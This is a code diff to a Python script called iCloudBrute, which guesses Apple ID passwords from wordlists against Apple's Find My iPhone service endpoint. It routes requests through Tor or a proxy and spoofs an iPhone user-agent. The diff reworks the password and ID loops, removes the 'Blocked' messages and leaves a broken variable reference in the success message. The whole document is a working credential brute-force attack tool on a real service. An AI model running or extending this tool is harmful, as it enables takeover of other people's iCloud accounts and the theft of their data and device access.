@@ -4,6 +4,7 @@
 
 import sys
 import getopt
+import random
 import urllib3
 import plistlib
 import requests
@@ -46,6 +47,7 @@ class iCloudBrute(object):
         self.banner()
         tor = False;apple_id=None
         proxy = None;idw=None
+        wproxy = None
         if len(sys.argv) < 4:
             self.usage()
         try:
@@ -60,27 +62,28 @@ class iCloudBrute(object):
             if opt in ("--tor"): tor = True
         print('[ i ] Starting bruteforce...')
         if apple_id and wordlist:
-            for p in self.readfile(wordlist):
-                p = p.decode('utf-8')
-                print("[ * ] Trying with password: %s"%p)
-                r = self.check(apple_id,p,proxy,tor)
+            for passwd in self.readfile(wordlist):
+                passwd = passwd.decode('utf-8')
+                sys.stdout.write('[ * ] Trying with password: %s\r'%(passwd))
+                sys.stdout.flush()
+                r = self.check(apple_id,passwd,proxy,tor)
                 if r is True:
                     print('[ + ] Password found: %s'%p)
                     break
-                elif r is None:
-                    print('[ ! ] Blocked!!!')
+            exit(print(''))
         if idw and wordlist:
             for i in self.readfile(idw):
+                i = i.decode('utf-8')
+                print('[ * ] Starting bruteforce for: %s'%(i))
                 for p in self.readfile(wordlist):
                     p = p.decode('utf-8')
-                    i = i.decode('utf-8')
-                    print("[ * ] Trying Password: %s - ID: %s"%(p,i))
+                    sys.stdout.write('[ * ] Trying with password: %s\r'%(p))
+                    sys.stdout.flush()
                     r = self.check(i,p,proxy,tor)
                     if r is True:
                         print('[ + ] Found Password: %s for ID: %s'%(p,i))
                         break
-                    elif r is None: 
-                        print('[ ! ] Blocked!!!')
+            exit(print(''))
         else: self.usage()
     
     def check(self,apple_id,passwd,proxy,tor):
@@ -89,7 +92,7 @@ class iCloudBrute(object):
         if proxy != ('' or None): proxies = {'http':proxy,'https':proxy} 
         url = ('https://fmipmobile.icloud.com/fmipservice/device/%s/initClient'%apple_id)
         headers = {
-            'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_2 like Mac OS X)'
+            'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)'
         }
         data = {"clientContext": {"appName":"FindMyiPhone","osVersion":"7.0.4","clientTimestamp": 429746389281,
         "appVersion":"3.0","deviceUDID":"0123456789485ef5b1e6c4f356453be033d15622","inactiveTime":1,
